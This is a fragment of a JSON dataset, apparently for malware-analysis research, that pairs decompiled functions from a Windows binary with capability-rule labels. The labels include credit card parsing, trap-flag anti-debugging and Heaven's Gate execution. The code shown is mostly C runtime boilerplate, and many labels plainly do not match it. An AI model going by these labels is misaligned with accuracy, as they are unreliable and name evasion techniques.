uVar2 = uVar4;\n                }\n                if (uVar4 == 0x29) {\n                    iVar3 = 4;\n                }\n                else {\ncode_r0x004b43d3:\n                    cVar1 = fcn.004b4cac();\n                    iVar3 = (-(cVar1 != '\\0') & 0xfffffffd) + 7;\n                }\n            }\n            else {\n                fcn.00402ecd(uVar2);\n                iVar3 = 6;\n            }\n        }\n        else {\n            fcn.00402ecd(*arg_8h);\n            iVar3 = 5;\n        }\n    }\n    else {\n        cVar1 = fcn.004b4cac();\n        iVar3 = (-(cVar1 != '\\0') & 0xfffffffd) + 7;\n    }\n    return iVar3;\n}\n",
        "token_count": 715
    },
    "00405a8d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405a8d(uint32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    \n    if (9 < arg_8h) {\n        return 1;\n    }\n    // switch table (10 cases) at 0x4b46cf\n    switch(*(arg_8h * 4 + 0x4b46cf)) {\n    case 0x4b45a4:\n        uVar2 = fcn.004023ec(arg_ch, arg_10h);\n        break;\n    case 0x4b45b6:\n        uVar2 = fcn.00405e43(arg_ch, arg_10h);\n        break;\n    case 0x4b45c3:\n        uVar1 = -(*(arg_ch + 0x308) != '\\0') & 0x80000000;\n        goto code_r0x004b45da;\n    case 0x4b45e6:\n        uVar1 = ((*(arg_ch + 0x308) == '\\0') - 1 & 0x80000000) + 0x7f800000 | *arg_10h & 0x7f800000;\n        goto code_r0x004b4611;\n    case 0x4b4615:\n        uVar1 = ((*(arg_ch + 0x308) == '\\0') - 1 & 0x80000000) + 0x7fffffff;\ncode_r0x004b45da:\n        *arg_10h = uVar1;\ncode_r0x004b45df:\n        uVar2 = 0;\n        break;\n    case 0x4b4632:\n        uVar1 = ((*(arg_ch + 0x308) == '\\0') - 1 & 0x80000000) + 0x7f800000 | *arg_10h & 0x7f800000 | 1;\ncode_r0x004b4611:\n        *arg_10h = uVar1;\n        goto code_r0x004b45df;\n    case 0x4b4662:\n        *arg_10h = 0xffc00000;\n        goto code_r0x004b45df;\n    case 0x4b4670:\n        *arg_10h = 0;\n        return 1;\n    case 0x4b467c:\n        uVar2 = 2;\n        *arg_10h = -(*(arg_ch + 0x308) != '\\0') & 0x80000000;\n        break;\n    case 0x4b469d:\n        uVar2 = 3;\n        *arg_10h = ((*(arg_ch + 0x308) == '\\0') - 1 & 0x80000000) + 0x7f800000 | *arg_10h & 0x7f800000;\n    }\n    return uVar2;\n}\n",
        "token_count": 673
    },
    "004caaae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23",
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004caaae(int32_t arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint arg_10h;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint8_t *puVar10;\n    uint *arg_18h;\n    uint8_t *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint *var_4h;\n    \n    var_14h = arg_8h;\n    var_10h = 0;\n    if ((*(arg_8h + 0xb0) == 0) && (*(arg_8h + 0xac) == 0)) {\n        puVar12 = NULL;\n        var_4h = NULL;\n        arg_18h = 0x56cd10;\n    }\n    else {\n        var_ch = 1;\n        arg_18h = fcn.00404fd9(1, 0x50);\n        if (arg_18h == NULL) {\n            return 1;\n        }\n        puVar12 = *(arg_8h + 0x88);\n        puVar13 = arg_18h;\n        for (iVar9 = 0x14; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar13 = *puVar12;\n            puVar12 = puVar12 + 1;\n            puVar13 = puVar13 + 1;\n        }\n        puVar12 = fcn.00403ff3(4);\n        var_4h = puVar12;\n        fcn.00406302(0);\n        if (puVar12 == NULL) {\n            fcn.00406302(arg_18h);\n            return 1;\n        }\n        *puVar12 = 0;\n        if (*(arg_8h + 0xb0) == 0) {\n            *arg_18h = *0x56cd10;\n            arg_18h[1] = *0x56cd14;\n            arg_18h[2] = *0x56cd18;\n            arg_18h[0xc] = *0x56cd40;\n            arg_18h[0xd] = *0x56cd44;\n            puVar12 = NULL;\n        }\n        else {\n            puVar12 = fcn.00403ff3(4);\n            var_8h = puVar12;\n            fcn.00406302(0);\n            if (puVar12 == NULL) {\n                fcn.00406302(arg_18h);\ncode_r0x004cabf8:\n                fcn.00406302(var_4h);\n                return var_ch;\n            }\n            *puVar12 = 0;\n            arg_10h = *(arg_8h + 0xb0);\n            uVar4 = fcn.00401acd(&var_14h, 1, arg_10h, 0xe, arg_18h);\n            uVar5 = fcn.00401acd(&var_14h, 1, arg_10h, 0xf, arg_18h + 1);\n            uVar6 = fcn.00401acd(&var_14h, 1, arg_10h, 0x10, arg_18h + 2);\n            uVar7 = fcn.00401acd(&var_14h, 2, arg_10h, 0xe, arg_18h + 0xc);\n            uVar8 = fcn.00401acd(&var_14h, 2, arg_10h, 0xf, arg_18h + 0xd);\n            if ((uVar8 | uVar4 | uVar5 | uVar6 | uVar7) != 0) {\n                fcn.0040207c(arg_18h);\n                fcn.00406302(arg_18h);\n                fcn.00406302(var_8h);\n                var_ch = 0xffffffff;\n                goto code_r0x004cabf8;\n            }\n            puVar10 = arg_18h[2];\n            while (uVar2 = *puVar10,  puVar12 = var_8h,  uVar2 != 0) {\n                if (uVar2 - 0x30 < 10) {\n                    *puVar10 = uVar2 - 0x30;\ncode_r0x004cac16:\n                    puVar10 = puVar10 + 1;\n                }\n                else {\n                    puVar11 = puVar10;\n                    if (uVar2 != 0x3b) goto code_r0x004cac16;\n                    do {\n                        puVar1 = puVar11 + 1;\n                        *puVar11 = *puVar1;\n                        puVar11 = puVar11 + 1;\n                    } while (*puVar1 != 0);\n                }\n            }\n        }\n        *var_4h = 1;\n        if (puVar12 != NULL) {\n            *puVar12 = 1;\n        }\n    }\n    piVar3 = *(arg_8h + 0x80);\n    if (piVar3 != NULL) {\n        LOCK();\n        *piVar3 = *piVar3 + -1;\n    }\n    piVar3 = *(arg_8h + 0x7c);\n    if (piVar3 != NULL) {\n        LOCK();\n        iVar9 = *piVar3;\n        *piVar3 = iVar9 + -1;\n        if (iVar9 + -1 == 0) {\n            fcn.00406302(*(arg_8h + 0x7c));\n            fcn.00406302(*(arg_8h + 0x88));\n        }\n    }\n    *(arg_8h + 0x7c) = var_4h;\n    *(arg_8h + 0x80) = puVar12;\n    *(arg_8h + 0x88) = arg_18h;\n    return 0;\n}\n",
        "token_count": 1394
    },
    "00403175": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint16_t __cdecl fcn.00403175(uint16_t *arg_8h, uint16_t **arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    \n    uVar3 = 0;\n    iVar2 = 0;\n    uVar1 = *arg_8h;\n    do {\n        if ((uVar1 != *(iVar2 + 0x552300)) && (uVar1 != *(L\"snan)\" + iVar2))) goto code_r0x004b4573;\n        iVar2 = iVar2 + 2;\n        uVar1 = **arg_ch;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar1;\n    } while (iVar2 != 10);\n    uVar3 = 1;\ncode_r0x004b4573:\n    return uVar1 & 0xff00 | uVar3;\n}\n",
        "token_count": 210
    },
    "00405a29": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405a29(uint16_t *arg_8h, uint16_t **arg_ch, uint16_t *arg_10h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uStackY32;\n    uint var_4h;\n    \n    uVar2 = *arg_8h;\n    iVar4 = 0;\n    iVar3 = 0;\n    while ((uVar2 == *(iVar3 + 0x5522b0) || (uVar2 == *(iVar3 + 0x5522b8)))) {\n        iVar3 = iVar3 + 2;\n        uVar1 = **arg_ch;\n        uVar2 = uVar1;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar1;\n        if (iVar3 == 6) {\n            fcn.00402ecd(uVar2);\n            arg_10h = *arg_ch;\n            uVar1 = *arg_10h;\n            uVar2 = uVar1;\n            *arg_ch = arg_10h + 1;\n            *arg_8h = uVar1;\n            while ((uVar2 == *(L\"INITY\" + iVar4) || (uVar2 == *(L\"inity\" + iVar4)))) {\n                iVar4 = iVar4 + 2;\n                uVar1 = **arg_ch;\n                uVar2 = uVar1;\n                *arg_ch = *arg_ch + 1;\n                *arg_8h = uVar1;\n                if (iVar4 == 10) {\n                    fcn.00402ecd(uVar2);\n                    return 3;\n                }\n            }\n            fcn.00402ecd(uVar2);\n            uStackY32 = 3;\ncode_r0x004b4114:\n            *arg_8h = 0;\n            *arg_ch = arg_10h;\n            return uStackY32;\n        }\n    }\n    fcn.00402ecd(uVar2);\n    goto code_r0x004b4114;\n}\n",
        "token_count": 468
    },
    "004633b5": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.004633b5(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x4e3073;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x56cca8 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    while (*0x56ccc4 < 10) {\n        iVar1 = *0x56ccc4 * 4;\n        *0x56ccc4 = *0x56ccc4 + 1;\n        pcVar3 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*(iVar1 + 0x56f2b0), uVar2);\n        if (pcVar3 != NULL) {\n            (**0x573000)();\n            (*pcVar3)();\n        }\n    }\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 241
    },
    "00401974": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401974(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 95
    },
    "00401b90": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.00401b90(uint8_t param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if (0x3f < param_1) {\n        return 0;\n    }\n    if (param_1 < 0x20) {\n        return CONCAT44(param_2 >> (param_1 & 0x1f), in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));\n    }\n    return param_2 >> (param_1 & 0x1f);\n}\n",
        "token_count": 145
    },
    "00401bf9": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401bf9(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 96
    },
    "00402fae": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402fae(uint arg_8h)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    \n    uVar2 = *0x56cca8 & 0x1f;\n    pcVar3 = (*0x56cca8 ^ *0x57002c) >> uVar2 | (*0x56cca8 ^ *0x57002c) << 0x20 - uVar2;\n    if (pcVar3 == NULL) {\n        uVar1 = 0;\n    }\n    else {\n        (**0x573000)(arg_8h);\n        uVar1 = (*pcVar3)();\n    }\n    return uVar1;\n}\n",
        "token_count": 160
    },
    "00403026": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403026(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 95
    },
    "004039fe": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004039fe(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 95
    },
    "004040a7": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.004040a7(uint8_t param_1, int32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if (0x3f < param_1) {\n        return 0;\n    }\n    if (param_1 < 0x20) {\n        return CONCAT44(param_2 << (param_1 & 0x1f) | in_EAX >> 0x20 - (param_1 & 0x1f), in_EAX << (param_1 & 0x1f));\n    }\n    return (in_EAX << (param_1 & 0x1f)) << 0x20;\n}\n",
        "token_count": 152
    },
    "00404359": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404359(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 95
    },
    "00404499": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.00404499(void)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.00402289(0x56adc8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406401(0);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = *0x56cca8 & 0x1f;\n    uVar2 = (*0x56cca8 ^ *0x56f4c8) >> uVar1 | (*0x56cca8 ^ *0x56f4c8) << 0x20 - uVar1;\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004a836a();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 279
    },
    "004044e9": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004044e9(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 96
    },
    "00404840": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t fcn.00404840(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = *0x56cca8 & 0x1f;\n    uVar1 = (*0x56cca8 ^ *0x57002c) >> uVar2 | (*0x56cca8 ^ *0x57002c) << 0x20 - uVar2;\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 115
    },
    "00405141": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405141(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 95
    },
    "00405420": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405420(uint arg_8h)\n\n{\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    fcn.004055d3(&var_4h, arg_8h);\n    return var_4h & 0x1f;\n}\n",
        "token_count": 71
    },
    "004055d3": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004055d3(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if ((arg_ch & 0x1f) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        uVar1 = fcn.0040480e();\n        uVar2 = fcn.00405f88(arg_ch & 0x1f);\n        *arg_8h = uVar2 & uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 133
    },
    "00405619": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00405619(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 95
    },
    "00405ede": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405ede(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if ((arg_ch & 0x1f) != 0) {\n        uVar1 = fcn.00405f88(arg_ch & 0x1f);\n        uVar2 = fcn.00405f88(0x3f);\n        uVar4 = *arg_8h;\n        uVar3 = fcn.0040480e();\n        uVar1 = uVar3 & ~uVar1 | uVar4 & uVar2 & uVar1;\n        fcn.00402973(uVar1);\n        uVar1 = uVar1 & 0x1f;\n        uVar4 = fcn.00405420(uVar1);\n        if (uVar4 != uVar1) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 233
    },
    "00405fba": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405fba(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    \n    iVar1 = fcn.004067f8();\n    if (((iVar1 == 0) || (pcVar3 = *(iVar1 + 0x35c),  pcVar3 == NULL)) &&\n       (uVar2 = *0x56cca8 & 0x1f,  pcVar3 = (*0x56cca8 ^ *0x56f4bc) >> uVar2 | (*0x56cca8 ^ *0x56f4bc) << 0x20 - uVar2, \n       pcVar3 == NULL)) {\n        fcn.004035f8(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    (**0x573000)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 278
    },
    "00406816": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406816(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x56cca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x56cca8;\n}\n",
        "token_count": 95
    },
    "00402586": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nushort __cdecl fcn.00402586(uint arg_8h)\n\n{\n    if ((((arg_8h != 100) && (arg_8h != 0x69)) && (arg_8h != 0x6f)) &&\n       (((arg_8h != 0x75 && (arg_8h != 0x78)) && ((arg_8h != 0x58 && (arg_8h != 0x2a)))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 116
    },
    "0040385a": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nushort __cdecl fcn.0040385a(uint arg_8h)\n\n{\n    if ((((arg_8h != 100) && (arg_8h != 0x69)) && (arg_8h != 0x6f)) &&\n       (((arg_8h != 0x75 && (arg_8h != 0x78)) && ((arg_8h != 0x58 && (arg_8h != 0x2a)))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 117
    },
    "00404589": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00404589(uint arg_8h)\n\n{\n    if ((((arg_8h != 'd') && (arg_8h != 'i')) && (arg_8h != 'o')) &&\n       (((arg_8h != 'u' && (arg_8h != 'x')) && ((arg_8h != 'X' && (arg_8h != '*')))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 103
    },
    "0040583a": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.0040583a(uint arg_8h)\n\n{\n    if ((((arg_8h != 'd') && (arg_8h != 'i')) && (arg_8h != 'o')) &&\n       (((arg_8h != 'u' && (arg_8h != 'x')) && ((arg_8h != 'X' && (arg_8h != '*')))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 104
    },
    "004026d5": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004026d5(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    fcn.0040314d(arg_8h, 0, 0x2c);\n    uVar1 = fcn.00403030();\n    *arg_8h = uVar1;\n    uVar1 = fcn.004038a0();\n    arg_8h[1] = uVar1;\n    iVar2 = fcn.0040379c();\n    iVar2 = *(iVar2 + 8);\n    arg_8h[2] = iVar2 == 0;\n    if (iVar2 != 0) {\n        iVar2 = fcn.00404d04();\n        do {\n            if (*(iVar2 + uVar3 * 2) < 0) {\n                *((uVar3 >> 3) + 0xc + arg_8h) = *((uVar3 >> 3) + 0xc + arg_8h) | 1 << (uVar3 & 7);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    return arg_8h;\n}\n",
        "token_count": 289
    },
    "00403625": {
        "rules": [
            "check for trap flag exception/d5d4160e77a5474aa5157e4631e4f1b3"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00403625(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint uVar3;\n    char *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    cVar1 = **0x56f458;\n    pcVar2 = *0x56f458;\n    if (cVar1 == '\\0') {\ncode_r0x0048ebd7:\n        *0x56f458 = pcVar2;\n        fcn.004012ad(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if (cVar1 == '$') {\n        if ((*0x56f458)[1] == '$') {\n            pcVar2 = *0x56f458 + 2;\n            cVar1 = *pcVar2;\n            if (cVar1 < 'S') {\n                if (cVar1 == 'R') {\n                    if (*arg_ch == 0) {\n                        var_10h = \"volatile\";\n                        var_ch = 8;\n                    }\n                    else {\n                        var_10h = \"volatile \";\n                        var_ch = 9;\n                    }\n                    *0x56f458 = pcVar2;\n                    fcn.004022a2(&var_10h);\n                }\n                else {\n                    if (cVar1 == '\\0') goto code_r0x0048ebd7;\n                    if (cVar1 == 'A') {\n                        *0x56f458 = *0x56f458 + 3;\n                        fcn.0040683e(arg_8h, arg_ch);\n                        return arg_8h;\n                    }\n                    if (cVar1 == 'B') {\n                        *0x56f458 = *0x56f458 + 3;\n                        fcn.00405097(arg_8h, arg_ch, 1);\n                        return arg_8h;\n                    }\n                    if (cVar1 == 'C') {\n                        *0x56f458 = *0x56f458 + 3;\n                        var_10h = NULL;\n                        var_ch = 0;\n                        uVar3 = fcn.004013d4(&var_8h, arg_ch, 0, &var_10h, 0);\n                        fcn.00405b41(arg_8h, uVar3);\n                        return arg_8h;\n                    }\n                    *0x56f458 = pcVar2;\n                    if (cVar1 != 'Q') goto code_r0x0048ed62;\n                }\n                uVar3 = 3;\n                goto code_r0x0048eb9c;\n            }\n            if (cVar1 == 'S') {\n                pcVar2 = *0x56f458 + 3;\n            }\n            else {\n                if (cVar1 == 'T') {\n                    *0x56f458 = *0x56f458 + 3;\n                    if (*arg_ch != 0) {\n                        var_10h = \"std::nullptr_t \";\n                        var_ch = 0xf;\n                        fcn.00404025(arg_8h, &var_10h, arg_ch);\n                        return arg_8h;\n                    }\n                    var_10h = \"std::nullptr_t\";\n                    var_ch = 0xe;\n                    fcn.00402cfc(&var_10h);\n                    return arg_8h;\n                }\n                if (cVar1 == 'V') {\n                    *0x56f458 = *0x56f458 + 3;\n                    *arg_8h = *arg_ch;\n                    arg_8h[1] = arg_ch[1];\n                    return arg_8h;\n                }\n                if (cVar1 == 'Y') {\n                    *0x56f458 = *0x56f458 + 3;\n                    fcn.004063b6(arg_8h);\n                    return arg_8h;\n                }\n            }\n        }\n        else if ((*0x56f458)[1] == '\\0') goto code_r0x0048ebd7;\ncode_r0x0048ed62:\n        *0x56f458 = pcVar2;\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    else {\n        if (cVar1 != 'A') {\n            if (cVar1 != 'B') {\n                fcn.00405b41(arg_8h, arg_ch);\n                return arg_8h;\n            }\n            if (*arg_ch == 0) {\n                var_10h = \"volatile\";\n                var_ch = 8;\n            }\n            else {\n                var_10h = \"volatile \";\n                var_ch = 9;\n            }\n            fcn.004022a2(&var_10h);\n        }\n        uVar3 = 2;\ncode_r0x0048eb9c:\n        var_10h = *arg_ch;\n        *0x56f458 = *0x56f458 + 1;\n        var_ch = arg_ch[1] | 0x100;\n        fcn.00404c6e(arg_8h, &var_8h, &var_10h, uVar3);\n    }\n    return arg_8h;\n}\n",
        "token_count": 1206
    },
    "0040657d": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.0040657d(void)\n\n{\n    if ((*0x56cca8 == 0xbb40e64e) || ((*0x56cca8 & 0xffff0000) == 0)) {\n        *0x56cca8 = fcn.0045eb49();\n        if (*0x56cca8 == 0xbb40e64e) {\n            *0x56cca8 = 0xbb40e64f;\n        }\n        else if ((*0x56cca8 & 0xffff0000) == 0) {\n            *0x56cca8 = *0x56cca8 | (*0x56cca8 | 0x4711) << 0x10;\n        }\n    }\n    *0x56cca4 = ~*0x56cca8;\n    return;\n}\n",
        "token_count": 179
    },
    "0040332d": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040332d(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 92
    },
    "00406861": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nulong __cdecl fcn.00406861(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint *arg_18h)\n\n{\n    arg_18h[1] = (arg_ch + 0x3ffU & 0x7ff | (arg_8h & 0xff) << 0xb) << 0x14 | arg_14h & 0xfffff;\n    *arg_18h = arg_10h;\n    return 0;\n}\n",
        "token_count": 121
    },
    "004037e7": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004037e7(uint lpBuffer, uint nNumberOfCharsToWrite, uint lpNumberOfCharsWritten)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteConsoleW)\n                      (*0x56d930, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, 0);\n    if (iVar1 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar2 == 6) {\n            fcn.004060aa();\n            fcn.004df91d();\n            iVar1 = (*_sym.imp.KERNEL32.dll_WriteConsoleW)\n                              (*0x56d930, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, 0);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 190
    },
    "00404cf0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
